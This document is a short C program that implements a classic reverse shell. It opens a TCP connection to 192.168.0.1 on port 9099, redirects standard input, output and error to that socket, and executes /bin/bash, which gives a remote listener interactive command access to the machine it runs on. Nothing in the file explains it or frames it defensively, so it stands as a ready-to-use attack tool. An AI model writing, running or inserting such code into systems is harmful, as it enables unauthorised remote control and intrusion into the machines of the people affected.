#include <sys/socket.h>
#include <netinet/in.h>


int main()
{
	char *shell[2];
	int soc,remote;
	struct sockaddr_in server_addr;

	server_addr.sin_family = 2;
	server_addr.sin_addr.s_addr = inet_addr("192.168.0.1");
	server_addr.sin_port = htons(9099);

	soc = socket(2,1,0);
	remote = connect(soc, (struct sockaddr*)&server_addr, 0x10);

	dup2(soc,0);
	dup2(soc,1);
	dup2(soc,2);

	shell[0] = "/bin/bash";
	shell[1] = 0;

	execve(shell[0], shell, 0);
}

